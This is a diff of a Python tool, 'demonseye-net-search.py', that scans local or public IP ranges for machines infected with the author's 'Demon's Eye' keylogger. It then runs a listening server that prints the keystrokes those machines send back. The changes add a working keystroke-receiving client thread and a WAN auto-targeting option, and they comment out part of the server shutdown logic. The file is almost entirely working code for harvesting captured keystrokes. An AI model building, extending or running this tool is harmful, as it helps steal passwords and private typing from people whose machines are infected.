@@ -2,25 +2,28 @@
 # -*- coding: utf-8 -*-
 #
 # -----------------------------------------------------------------------------------------------------------
-# Name:         demonseye-net-search.py
-# Purpose:      Search for possible active keyloggers in a network range.
-#               If the scanner finds a Demon's Eye Keylogger,
-#               a small server can be activated to receive the keys.
-#               Alternatively, it can be used as a normal network scanner, since it allows you to specify
-#               which ports you want to check. It uses multithreading techniques so you can check
-#               65000 (rounding) computers in approximately 95 seconds.
+# Name:             demonseye-net-search.py
+# Purpose:          Search for possible active keyloggers in a network range.
+#                   If the scanner finds a Demon's Eye Keylogger,
+#                   a small server can be activated to receive the keys.
+#                   Alternatively, it can be used as a normal network scanner, since it allows you to specify
+#                   which ports you want to check. It uses multithreading techniques so you can check
+#                   65000 (rounding) computers in approximately 95 seconds.
 #
-# Author:       Gabriel Marti Fuentes
-# email:        gabimarti at gmail dot com
-# GitHub:       https://github.com/gabimarti
-# Created:      29/07/2019
-# License:      GPLv3
+# Author:           Gabriel Marti Fuentes
+# email:            gabimarti at gmail dot com
+# GitHub:           https://github.com/gabimarti
+# Created:          29/07/2019
+# License:          GPLv3
+# First Release:
+# Version:          0.0.1
 # -----------------------------------------------------------------------------------------------------------
-#
+
 
 import argparse
 import base64
 import ipaddress
+import msvcrt
 import socket
 import sys
 import threading
@@ -31,10 +34,10 @@ import urllib.request
 # CONSTANTS
 ########################################################
 APPNAME = 'Demon\'s Eye Keylogger Network Search'                   # Just a name
-VERSION = '1.0'                                                     # Version
-NET_ADDRESS = '192.168.10.0/24'                                     # Network adress range to scan (CIDR)
+VERSION = 'v0.0.1'                                                  # Version
 KEYLOGGER_PORT = 6666                                               # Port of keylogger
 DEFAULT_SERVER_PORT = 7777                                          # Port to receive response after connect
+SERVER_ACCEPT_TIMEOUT = 0.1
 HOST_BIND = ''                                                      # Bind address to listen server (any)
 MAX_CLIENTS = 10                                                    # Number of keyloggers to listen
 PORT_LIST_SCAN = [KEYLOGGER_PORT]                                   # List of ports to Scan. For testing multiple ports
@@ -43,24 +46,24 @@ BUFFER_SIZE = 4096                                                  # Buffer siz
 DEFAULT_TIMEOUT = 2                                                 # Default Timeout (seconds)
 DEFAULT_NO_WAIT_RESPONSE = False                                    # No Wait response after sending message
 ENCODING = 'utf-8'                                                  # Encoding for message sended
-VERBOSE_LEVELS = ['none', 'a bit', 'insane debug']                  # Verbose levels
+VERBOSE_LEVELS = ['low', 'a bit', 'insane debug']                   # Verbose levels
 DEMONS_EYE_ID = 'D3Y3K3YL0G'                                        # Keylogger ID in response
 
 
 ########################################################
 # VARIABLES
 ########################################################
-threadList = []                                                     # List of active threads
-verbose = 0                                                         # Verbosity disabled, enabled
-net_range = NET_ADDRESS                                             # Network Range for command line test
-port_list = []                                                      # Port list for command line test
-timeout = DEFAULT_TIMEOUT                                           # Timeout on port connection
-total_threads_launched = 0                                          # Total threads launched
-total_current_threads_running = 0                                   # Total threads running at one moment
-max_concurrent_threads = 0                                          # Store max concurrent threads
-keyloggers_found = False                                            # If keylogger is found
-listen_server_enabled = False                                       # Is listen Server Enabled?
-listen_server_instance = None                                       # Listen server object
+threadList = []                                         # List of active threads
+verbose = 0                                             # Verbosity disabled, enabled
+net_range = ''                                          # Network Range to scan, if not provided, it detects itself
+port_list = []                                          # Port list for command line test
+timeout = DEFAULT_TIMEOUT                               # Timeout on port connection
+total_threads_launched = 0                              # Total threads launched
+total_current_threads_running = 0                       # Total threads running at one moment
+max_concurrent_threads = 0                              # Store max concurrent threads
+keyloggers_found = False                                # If keylogger is found
+listen_server_enabled = False                           # Is listen Server Enabled?
+listen_server_instance = None                           # Listen server object
 
 
 ########################################################
@@ -83,16 +86,43 @@ class ListenServer(threading.Thread):
     def kill_server(self):
         self._server_running = False
         # Kill clients
+        '''
         for client in self.client_thread_list:
             try:
-                client.shutdown(socket.SHUT_RDWR)
-                client.close()
+                client.conn.close()
             except socket.error:
                 pass  # socket already closed. don't worry
         return self._server_running
+        '''
 
-    def client_thread(self):
-        pass
+    def client_thread(self, conn, ip, port, buffer_size):
+        print('Connection from {}:{:5d}'.format(ip, port))
+        while self._server_running:
+            # the input is in bytes, so decode it
+            input_from_client_bytes = conn.recv(self._max_buffer_size)
+            '''
+            if not input_from_client_bytes:
+                print('No data. from {}:{}'.format(ip, port))
+
+            # max_buffer_size indicates how big the message can be
+            # this is test if it's sufficiently big
+            siz = sys.getsizeof(input_from_client_bytes)
+            if siz >= buffer_size:
+                print('The length of input is probably too long: {}'.format(siz))
+            '''
+
+            # Prints received char
+            print(input_from_client_bytes.decode(ENCODING), end='')
+
+        conn.close()
+        '''
+        NO REPLY
+        try:
+            conn.sendall(res_encoded)  # send it to client
+            conn.close()  # close connection
+        except Exception as e:
+            print_verbose('Socket Error: {:s} '.format(e), 1, verbose)
+        '''
 
     def run(self):
         # Create socket and bind to local host and port
@@ -105,22 +135,26 @@ class ListenServer(threading.Thread):
             return
 
         # Start listening on socket
+        self._server_socket.settimeout(SERVER_ACCEPT_TIMEOUT)
         self._server_socket.listen(self._max_clients)
         self._server_running = True
         while self._server_running:
             try:
-                (conn, (ip, port)) = self._server_socket.accept()   # Wait to accept a connection - blocking call
+                (conn, (ip, port)) = self._server_socket.accept()   # Wait to accept a connection - NO blocking call
+            except socket.timeout:
+                pass  # ignore timeout, next accept
             except Exception as e:
+                print('Se ha dejado de recibir datos del Keylogger. Excepcion {} '.format(e))
                 break                                               # Possibly closed server
-
-            self.clients_processed += 1
-            try:
-                client = threading.Thread(target=self.client_thread,
-                                          args=(conn, ip, port, max_buffer_size, verbose, kill_message))
-                client.start()
-                self.client_thread_list.append(client)
-            except Exception as e:
-                print('ListenServer, Running Server Error : {}'.format(e))
+            else:
+                self.clients_processed += 1
+                try:
+                    client = threading.Thread(target=self.client_thread,
+                                              args=(conn, ip, port, self._max_buffer_size))
+                    client.start()
+                    # self.client_thread_list.append(client)
+                except Exception as e:
+                    print('ListenServer, Client Listen Error : {}'.format(e))
 
         # Wait to finish threads (Is it necessary? I'm not sure)
         for client in self.client_thread_list:
@@ -257,18 +291,33 @@ class RangeScan(threading.Thread):
 # FUNCTIONS
 ########################################################
 
-# Obtiene la ip externa - Get the external ip
+# Get the external ip
 def get_external_ip():
     external_ip = urllib.request.urlopen('https://ident.me').read().decode(ENCODING)
     return external_ip
 
 
+# Convert an ip to a CIDR / 24 range
+def ip_to_cidr24(ip_to_convert):
+    blist = ip_to_convert.split('.')        # split bytes
+    blist[3] = '0'                          # changes last byte
+    cidr = '.'
+    cidr = cidr.join(blist)                 # collect the bytes again
+    cidr += '/24'                           # adds mask
+    return cidr
+
+
 # Parse command line parameters
 def parse_params():
-    parser = argparse.ArgumentParser(description='Demon\'s Eye Keylogger Network Search',
+    parser = argparse.ArgumentParser(description=APPNAME + ' ' + VERSION,
                                      epilog='You can also use it to scan specific ports on a network.')
-    parser.add_argument('-r', '--range', type=str, default=NET_ADDRESS, required=True,
-                        help='Specify the network range in CIDR format. Example: 192.168.1.0/24')
+    parser.add_argument('-r', '--range', type=str, default="",
+                        help='Specify the network range in CIDR format. ' +
+                             'If not provided, an attempt is made to autodetect a local class C range. ' +
+                             'Example: 192.168.1.0/24')
+    parser.add_argument('-w', '--wanauto', action='store_true', default=False,
+                        help='If this option is set (and no -r has been specified), ' +
+                             'an automatic class C range will be set for the current Wan IP.')
     parser.add_argument('-p', '--ports', type=int, nargs='+', default=list(PORT_LIST_SCAN),
                         help='Specify a list of ports to scan. Default value: ' + str(PORT_LIST_SCAN))
     parser.add_argument('-m', '--message', type=str, default=MAGIC_MESSAGE,
@@ -297,6 +346,7 @@ def main():
     args = parse_params()
     verbose = args.verbose
     net_range = args.range
+    wan_auto = args.wanauto
     port_list = args.ports
     message = args.message
     waitresponse = not args.nowaitresponse
@@ -309,16 +359,26 @@ def main():
     localip = socket.gethostbyname(hostname)
     externalip = get_external_ip()
 
+    print(APPNAME + ' ' + VERSION)
+    print('==============================================')
     print('Verbose level '+str(VERBOSE_LEVELS[verbose]))
-    print('Network range to scan '+net_range)
+    if net_range == "" and not wan_auto:
+        net_range = ip_to_cidr24(localip)
+        print('Network range to scan (local autodetect) ' + net_range)
+    elif net_range == "" and wan_auto:
+        net_range = ip_to_cidr24(externalip)
+        print('Network range to scan (wan autodetect) ' + net_range)
+    else:
+        print('Network range to scan '+net_range)
     print('Ports list '+str(port_list))
     print('Message to send \''+message+'\'')
-    print('Wait response after sende message '+str(waitresponse))
+    print('Wait response after send message '+str(waitresponse))
     print('Timeout %d seconds' % (timeout))
     if enable_server:
         print('Enabled Server to receive Keylogger Data at port %s' % server_port)
         try:
-            listen_server_instance = ListenServer(HOST_BIND,server_port,MAX_CLIENTS,BUFFER_SIZE)
+            listen_server_instance = ListenServer(HOST_BIND, server_port, MAX_CLIENTS, BUFFER_SIZE)
+            listen_server_instance.start()
             listen_server_enabled = True
         except Exception as e:
             print('Error starting Server {}'.format(e))
@@ -338,7 +398,7 @@ def main():
         print('Something strange happes because the threads running is %d ' % (total_current_threads_running))
 
     # No keylogger found
-    if keyloggers_found == False:
+    if enable_server and keyloggers_found == False:
         print('No Keyloggers found. Disabling Server...')
         enable_server = False
         listen_server_instance.kill_server()
@@ -349,8 +409,9 @@ def main():
     while enable_server and listen_server_enabled:
         if listen_server_instance is not None:
             print('Socket is Listening at {}:{}...'.format(hostname,server_port))
-            key = input('Enter "Q" o "q" to Exit : ').strip()
-            if key == "Q" or key == "q":
+            # key = input('Enter "Q" o "q" to Exit : ').strip()
+            key = msvcrt.getch()
+            if key == b"Q" or key == b"q":
                 listen_server_instance.kill_server()
                 listen_server_instance = None
                 listen_server_enabled = False
